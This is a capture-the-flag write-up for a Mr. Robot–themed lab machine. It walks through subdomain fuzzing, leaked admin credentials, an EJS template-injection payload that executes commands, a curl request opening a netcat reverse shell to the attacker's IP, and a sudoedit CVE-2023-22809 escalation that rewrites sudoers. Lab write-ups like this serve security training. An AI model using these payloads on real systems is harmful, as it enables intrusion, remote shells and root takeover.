## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Yet another Mr. Robot themed challenge.
## Welcome to Whiterose

This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

Go ahead and start the machine**, it may take a few minutes to fully start up.**

And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`
```
## Credentials
```Credentials
Olivia Cortez:olivi8
```
## IP-Address
```IP-Address
10.201.85.207
```
## RustScan
```bash
$ rustscan -a 10.201.85.207  -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```
Add Host in the `/etc/hosts` 
```bash
$ echo 10.201.85.207  cyprusbank.thm
$ cat /etc/hosts                      
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.68     planning.htb
10.201.85.207   cyprusbank.thm
```
## Browser
Lets Surf on the Browser, 
```Web-Content 
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
<h1>National Bank of Cyprus</h1>
<h3>We are currently under maintenance, thank you for your patience</h3>
<style>
body {
  padding: 40px;
}
</style>
```

## Gobuster 
```bash
$ gobuster dir -u http://cyprusbank.thm/  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 4 -x php,txt,bake
Index.html
```
We Got only `Index.html` and didn't find anything else so we surf for the subdomains
## FFUF
```bash
$ ffuf -u http://cyprusbank.thm/ \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.cyprusbank.thm" \
     -t 200 \
     -fw 1
www        [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 1393ms]
admin      [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 1431ms]
```
We Got 2 one is the normal `World Wide Web`
and second is `Admin`
so we should add this this in the `/etc/hosts`
```bash
cat /etc/hosts
10.201.85.207   cyprusbank.thm   admin.cyprusbank.thm
```
## Browser
Browse to http://admin.cyprusbank.thm/
```Information
we Got an Login page and where we already have the credentials and also we can use them to login and there are some options which are 
1. Home
2. Search
3. Setting
4. Messages
5. Login 
```
So lets Login using Credentials we have 
```Credentials 
Olivia Cortez:olivi8
```
After login in we Found Messages which Url is 
```URL 
http://admin.cyprusbank.thm/messages/?c=5
```
which shows 
```content
Cyprus National Bank - Admin Chat
Greger Ivayla: Looks really cool!
Jemmy Laurel: Hey have you guys seen Mrs. Jacobs recently??
Olivia Cortez: No she hasn't been around for a while
Jemmy Laurel: Oh, is she OK?
Olivia Cortez: <script>alert(1)</script>
```
where we try to inject the java-script alert to get something out of it but when i focused on the url i found there is an limit on that which is just 5 message to i increase the messages limit to `15` and got this 
```URl 
http://admin.cyprusbank.thm/messages/?c=15
```
Content 
```Content
Cyprus National Bank - Admin Chat
DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so
Gayle Bev: That's nice to hear!
Gayle Bev: Developers implemented this new messaging feature that I suggested! What you guys think?
Greger Ivayla: Looks really cool!
Jemmy Laurel: Hey have you guys seen Mrs. Jacobs recently??
Olivia Cortez: No she hasn't been around for a while
Jemmy Laurel: Oh, is she OK?
Olivia Cortez: <script>alert(1)</script>
```
Got Another Credentials which is 
```Credentials
Gayle Bev:p~]P@5!6;rs558:q
```
and from there we got access to the transactions and phone numbers
```output
Name	            Balance	                 Phone
Tyrell Wellick	    $20.855.900.000	         842-029-5701
```
I Got the Number and after that I ran into setting section where I let Know that I can Change anyone Password as Admin so I tried to `XXS-Injection` first using `Burp_suite`
## BurpSuite
```Request
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Length: 71
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin.cyprusbank.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin.cyprusbank.thm/settings
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3AUSsQI6GoZvVEWqgR57S118sgCTYU9taL.6EtcwC0rU%2BImbItRcme%2BzM2LbUGczAx1TGdo8nNph%2B8
Connection: keep-alive
name=Jack+Sparrow&password=[password omitted]
```
which gives me information about the Post request require 2 strings or inputs 
so I tried to send Without the Password and Got the know this 
```Output
ReferenceError: /home/web/app/views/settings.ejs:14
   12|   <div class="alert alert-info mb-3"><%= message %></div>
   13|   <% } %>
>> 14|   <% if (password != -1) { %>
   15|     <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
   16|   <% } %>
   17|   <% if (typeof error != 'undefined') { %>
password is not defined
    at eval ("/home/web/app/views/settings.ejs":27:8)
```
Which Tells Us About the Existance of EJS `Embedded JavaScript Templating` 
so we explore on web about and found an amazing `Github` Repo 
```Repo
https://github.com/mde/ejs/issues/735?source=post_page-----8c4434fd3e5b---------------------------------------
```
and Then we used the payload to get more into the system and Found this
```Burp_Req
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Length: 199
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin.cyprusbank.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin.cyprusbank.thm/settings
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3AUSsQI6GoZvVEWqgR57S118sgCTYU9taL.6EtcwC0rU%2BImbItRcme%2BzM2LbUGczAx1TGdo8nNph%2B8
Connection: keep-alive
name=John&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1%3Breturn%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27id%27).toString()%3B
```
And Got the Output this 
```Output
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 23 Aug 2025 11:51:32 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Powered-By: Express
ETag: W/"2d-Twvfcs7vXG2twwx8ZotyKWtzK/A"
Content-Length: 45
uid=1001(web) gid=1001(web) groups=1001(web)
```
and then we tried to get the Reverse shell Firstly we try using `Burpsuite` but its much more complicated so I switched to cURL
```bash
$ curl -s -k 'http://admin.cyprusbank.thm/settings' \
  -H 'Origin: http://admin.cyprusbank.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: connect.sid=s%3AUSsQI6GoZvVEWqgR57S118sgCTYU9taL.6EtcwC0rU%2BImbItRcme%2BzM2LbUGczAx1TGdo8nNph%2B8' \
  --data-urlencode "name=John" \
  --data-urlencode "settings[view options][client]=true" \
  --data-urlencode "settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc 10.17.36.74 4444 -e sh');"
```
After running this Got the Reverse-Shell
## Reverse-Shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.41.1] 41924
ls
components
index.js
node_modules
package-lock.json
package.json
routes
static
views
pwd
/home/web/app
cd ..
ls
app
user.txt
cat user.txt
[flag omitted]
```
## User Flag
```Flag
[flag omitted]
```

Now Lets Do Privilege Escalation
```bash
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
Then We tried with 
```bash
$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
server {
  listen 80;
    
  server_name admin.cyprusbank.thm;
    
  location / {
    proxy_pass http://localhost:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_cache_bypass $http_upgrade;
  }
}
```

Then we See more about sudoers and there versions 
```bash
$ sudo --version
Sudo version 1.9.12p1
```
Then Finding more About on Articles and Found one **CVE-2023–22809** which let us know about the vulnerability in the sudoers in version
using command
```bash
EDITOR="nano -- /etc/sudoers" sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
And with this we changed the Web Permission from 
```bash
(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
### TO 
```bash
(root) NOPASSWD: ALL
```
And then executes the command and Got Root
## Root Flag
```bash
web@cyprusbank:~$ sudo su
root@cyprusbank:/home/web# cd
root@cyprusbank:~# cat root.txt 
[flag omitted]
root@cyprusbank:~# 
```
Flag
```Flag
[flag omitted]
```